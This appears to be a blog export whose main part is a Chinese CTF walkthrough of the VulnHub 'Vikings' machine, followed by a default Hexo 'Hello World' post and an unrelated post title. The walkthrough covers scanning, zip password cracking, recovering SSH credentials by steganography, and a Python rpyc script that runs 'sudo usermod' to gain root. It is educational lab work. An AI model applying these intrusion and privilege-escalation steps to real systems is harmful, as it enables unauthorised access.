title: Viking
content:
靶机介绍本靶机解密风格很重，比较像ctf
靶机地址：https://download.vulnhub.com/vikings/Vikings.ova
目标：拿到2个flag
难度：低
信息搜集arp-scan -l

扫描网段内所有主机，确认目标靶机地址
nmap -p- 192.168.56.112

对靶机进行全端口扫描，扫出来了22和80端口
nmap -p22,80 -A 192.168.56.112

对两个端口的服务进行扫描
PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)80/tcp open  http    Apache httpd 2.4.29| http-ls: Volume /| SIZE  TIME              FILENAME| -     2020-10-29 21:07  site/|_|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Index of /



路径爆破gobuster这个工具已经赢dirsearch太多
gobuster dir -r -u http://192.168.56.112/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log

扫描发现：/war.txt              (Status: 200) [Size: 13]  
提示我们转到 http://192.168.56.112/site/war-is-over/
这个页面，返回一串类似base64的长数据，我们用kali保存数据到本地
curl http://192.168.56.112/site/war-is-over/|base64 -d >output



file查看文件类型
┌──(root💀kali)-[~]└─# file output                                                                                                                         output: Zip archive data, at least v5.1 to extract

但是解压需要密码，此处我们不知道密码，看看能不能爆破
爆破压缩包密码工具：john
zip2john output.zip >> passwd.txtjohn passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt 

很快爆破出了密码：ragnarok123
压缩包里是一张图片，根据经验应该是隐写
图片隐写比较低级的隐写，binwalk分离
//FamousBoatbuilder_floki@vikings                                     //f@m0usboatbuilde7 

ssh成功登录为floki用户
uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)



两个可疑的文本，可能对接下来的解题有帮助
floki@vikings:~$ cat readme.txt _______________________________________________________________________Floki-Creation____________________________________________________________________________________________________I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don't know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. I need to create this `boat` to find Ragnarfloki@vikings:~$ cat boat#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)



查看/etc/passwd
floki:x:1000:1000:floki:/home/floki:/bin/bashragnar:x:1001:1001::/home/ragnar:/bin/sh



提权用户组108(lxd)给我们可以提权的机会，参考：https://www.freebuf.com/articles/system/216803.html
但是这里依照靶机的意思我们继续解谜
==》I need to create this boat to find Ragnar
boat是我们提权到Ragnar用户的关键
boat:
#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)

可打印的字符是我们要找的对象
num是第二九个素数，109
collatz猜想：https://zh.wikipedia.org/wiki/%E8%80%83%E6%8B%89%E5%85%B9%E7%8C%9C%E6%83%B3

考拉兹猜想（英语：Collatz conjecture），又称为奇偶归一猜想、3n+1猜想、冰雹猜想、角谷猜想、哈塞猜想、乌拉姆猜想或叙拉古猜想，是指对于每一个正整数，如果它是奇数，则对它乘3再加1，如果它是偶数，则对它除以2，如此循环，最终都能够得到1。

#ascii 0-255可打印
编写脚本：
i = 109c = [i]while i!=1:    if(i%2) == 1:        i = i * 3 + 1    else:        i = i//2    if(i<256):        c.append(i)print(c)str = ''for n in c:    str = str + chr(n)print(str)

m¤R)|>^/GÖk¡òy¶[Îg¯§ûôz=¸\.F#j5 P(再筛选出中间可被键盘输出的字符，这里我们可以用cyberchef


猜测mR)|>^/Gky[gz=.F#j5P(为Ragnar用户的密码
ssh登录成功
这里登录的时候会请求ragnar的sudo密码，应该是系统初始的时候执行的命令
总之先拿到了ragnar的权限
$ iduid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)

升级一下shell到bash
SHELL=/bin/bash script -q /dev/null

拿到第一个flag
ragnar@vikings:~$ cat user.txt4bf930187d0149a9e4374a4e823f867d



rpc提权因为登录ragnar用户时，系统会自动sudo，我们可以看下这些预先储存好的命令
.profile, .bashrc, .bash_profile, /etc/profile, etc. 
当我们检查.profile文件时，我们会发现这一行命令
sudo python3 /usr/local/bin/rpyc_classic.py



虽然用户没有权限，但是我们仍然可以看一下有没有rpyc server在跑

计算机网络课中我们学过，rpc是用来实现远程调用的
rpyc文档：https://rpyc.readthedocs.io/en/latest/index.html

ragnar@vikings:~$ netstat -tnlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:18812         0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:42945         0.0.0.0:*               LISTEN      -         

既然他打开了服务端口，我们可以本地写一个脚本去连他的服务端，这样在服务端就有可能以root用户执行命令
（反弹shell失败了，这里更改ragnar用户的权限）
import rpycdef getshell():    import os    os.system("sudo usermod -a -G sudo ragnar") conn = rpyc.classic.connect("localhost")fn = conn.teleport(getshell)fn()

运行脚本后，ragnar已经有了sudo权限，重新用ragnar用户登录靶机，即可提权到root
root@vikings:/# cat root/root.txtf0b98d4387ff6da77317e582da98bf31

拿到第二个flag

title: Hello World
content:
Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post$ hexo new "My New Post"

More info: Writing
Run server$ hexo server

More info: Server
Generate static files$ hexo generate

More info: Generating
Deploy to remote sites$ hexo deploy

More info: Deployment
image Test
利贺田

title: php无字母数字构造-入门级
